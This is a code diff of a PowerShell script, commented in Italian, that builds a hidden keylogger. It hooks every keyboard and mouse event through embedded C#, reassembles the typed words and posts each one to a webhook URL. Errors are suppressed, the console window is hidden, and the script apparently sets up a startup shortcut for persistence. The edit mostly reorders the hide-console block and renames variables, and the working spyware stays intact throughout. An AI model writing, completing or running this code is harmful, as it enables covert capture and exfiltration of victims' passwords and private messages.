@@ -19,6 +19,20 @@ Create-StartupShortcut
 # --- Nascondi la console ---
 Add-Type -TypeDefinition @"
 using System;
+using System.Runtime.InteropServices;
+public class Win {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    public const int SW_HIDE = 0;
+}
+"@
+[Win]::ShowWindow([Win]::GetConsoleWindow(), [Win]::SW_HIDE)
+
+# --- Definizione GlobalListener con hook tastiera e mouse ---
+Add-Type -TypeDefinition @"
+using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -59,9 +73,9 @@ public class GlobalListener {
     public static void Start() {
         using (Process cur = Process.GetCurrentProcess())
         using (ProcessModule mod = cur.MainModule) {
-            IntPtr hModule = GetModuleHandle(mod.ModuleName);
-            _kbdHookID = SetWindowsHookEx(WH_KEYBOARD_LL, _keyboardProc, hModule, 0);
-            _mouseHookID = SetWindowsHookEx(WH_MOUSE_LL, _mouseProc, hModule, 0);
+            IntPtr hMod = GetModuleHandle(mod.ModuleName);
+            _kbdHookID = SetWindowsHookEx(WH_KEYBOARD_LL, _keyboardProc, hMod, 0);
+            _mouseHookID = SetWindowsHookEx(WH_MOUSE_LL, _mouseProc, hMod, 0);
         }
     }
 
@@ -76,19 +90,16 @@ public class GlobalListener {
             byte[] state = new byte[256];
             GetKeyboardState(state);
             uint scan = MapVirtualKey((uint)vk, 0);
-            var sb = new StringBuilder(2);
-            int r = ToUnicode((uint)vk, scan, state, sb, sb.Capacity, 0);
-            char c = r > 0 ? sb[0] : '\0';
+            StringBuilder sb = new StringBuilder(2);
+            int len = ToUnicode((uint)vk, scan, state, sb, sb.Capacity, 0);
+            char c = len > 0 ? sb[0] : '\0';
 
             if (c != '\0') _buffer.Append(c);
             else if (vk == (int)Keys.Space || vk == (int)Keys.Enter) {
                 _buffer.Append(vk == (int)Keys.Space ? ' ' : '\n');
                 FlushBuffer();
             }
-            if (vk == (int)Keys.Escape) {
-                Stop();
-                Application.Exit();
-            }
+            if (vk == (int)Keys.Escape) { Stop(); Application.Exit(); }
         }
         return CallNextHookEx(_kbdHookID, nCode, wParam, lParam);
     }
@@ -107,27 +118,14 @@ public class GlobalListener {
         }
     }
 }
-"@ -ReferencedAssemblies "System.Windows.Forms","System.Text","System.Core"
+"@ -ReferencedAssemblies "System.Windows.Forms"
 
-# Nascondi la console
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class Win {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetConsoleWindow();
-    [DllImport("user32.dll")]
-    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    public const int SW_HIDE = 0;
-}
-"@
-[Win]::ShowWindow([Win]::GetConsoleWindow(), [Win]::SW_HIDE)
-
-# Callback PowerShell: invia parola al webhook
-[GlobalListener]::Callback = [Action[string]]{ param($msg)
+# --- Callback PowerShell: invia parola al webhook ---
+[GlobalListener]::Callback = [System.Action[string]]{
+    param($msg)
     try { Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{ content = $msg } | ConvertTo-Json) -ContentType 'application/json' } catch {}
 }
 
-# Avvio dei hook invisibili
+# --- Avvio dei hook invisibili ---
 [GlobalListener]::Start()
 [System.Windows.Forms.Application]::Run()
